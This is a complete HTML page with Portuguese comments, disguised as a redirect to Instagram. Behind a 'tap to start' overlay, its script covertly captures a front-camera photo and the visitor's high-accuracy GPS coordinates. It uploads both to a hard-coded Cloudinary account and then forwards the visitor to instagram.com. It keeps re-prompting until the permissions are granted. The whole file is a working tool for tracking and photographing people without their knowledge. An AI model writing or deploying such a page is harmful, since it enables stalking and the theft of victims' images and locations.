<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin:0; overflow:hidden; background:#000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; justify-content: center; align-items: center;
      color: #fff; font-family: sans-serif; font-size: 20px;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      text-align: center;
      padding: 20px;
    }
  </style>
</head>
<body>
  <!-- Overlay inicial para interação -->
  <div id="overlay">Toque para iniciar</div>
  <script>
    const cloudName = "dx5legahb";      // Seu Cloudinary Cloud Name
    const uploadPreset = "upload";       // Seu Upload Preset (unsigned)
    const folderName = "capturas";       // Pasta de destino no Cloudinary

    let imageUrl = ""; // Armazena a URL da imagem capturada

    // Exibe o overlay com uma mensagem e chama a função fornecida ao tocar
    function showOverlay(message, clickHandler) {
      const overlay = document.getElementById("overlay");
      overlay.style.display = "flex";
      overlay.textContent = message;
      overlay.onclick = () => {
        overlay.style.display = "none";
        if (clickHandler) clickHandler();
      };
    }

    // Captura a foto usando a câmera frontal
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true; // Essencial para iOS
        video.muted = true;       // Necessário para autoplay no iOS
        video.srcObject = stream;
        await video.play();

        // Aguarda 300ms para garantir que o vídeo renderizou
        await new Promise(r => setTimeout(r, 300));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());

        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();

        const formData = new FormData();
        formData.append("file", imageBlob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);

        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: formData
        });
        if (!response.ok) throw new Error("Erro ao enviar imagem");
        const data = await response.json();
        return data.secure_url;
      } catch (error) {
        console.error("Erro na captura da foto:", error);
        showOverlay("As permissões de câmera são necessárias para continuar. Toque para tentar novamente.", startFlow);
        throw error;
      }
    }

    // Solicita a localização (diretamente em resposta a um clique do usuário)
    function requestLocation() {
      // Essa função é chamada diretamente pelo clique no overlay,
      // garantindo que o prompt de localização seja disparado no iOS.
      navigator.geolocation.getCurrentPosition((pos) => {
        const { latitude, longitude } = pos.coords;
        const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
        const textBlob = new Blob([texto], { type: "text/plain" });
        const textForm = new FormData();
        textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
        textForm.append("upload_preset", uploadPreset);
        textForm.append("folder", folderName);

        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
          method: "POST",
          body: textForm
        }).then(resp => {
          if (!resp.ok) throw new Error("Erro ao enviar localização");
          window.location.href = "https://instagram.com";
        }).catch(err => {
          console.error("Erro no envio da localização:", err);
          showOverlay("Permita a localização para continuar. Toque para tentar novamente.", requestLocation);
        });
      }, (err) => {
        console.error("Erro ao obter localização:", err);
        showOverlay("Permita a localização para continuar. Toque para tentar novamente.", requestLocation);
      }, {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });
    }

    // Função principal que gerencia o fluxo
    async function startFlow() {
      try {
        // Primeiro, captura a foto
        imageUrl = await capturePhoto();
        // Em seguida, exibe overlay para solicitar a localização
        showOverlay("Toque para permitir localização", requestLocation);
      } catch (e) {
        console.error("Erro no fluxo:", e);
      }
    }

    // Inicia o fluxo somente após o usuário tocar na tela (para garantir interação)
    document.getElementById("overlay").addEventListener("click", function handler() {
      document.getElementById("overlay").removeEventListener("click", handler);
      startFlow();
    });
  </script>
</body>
</html>
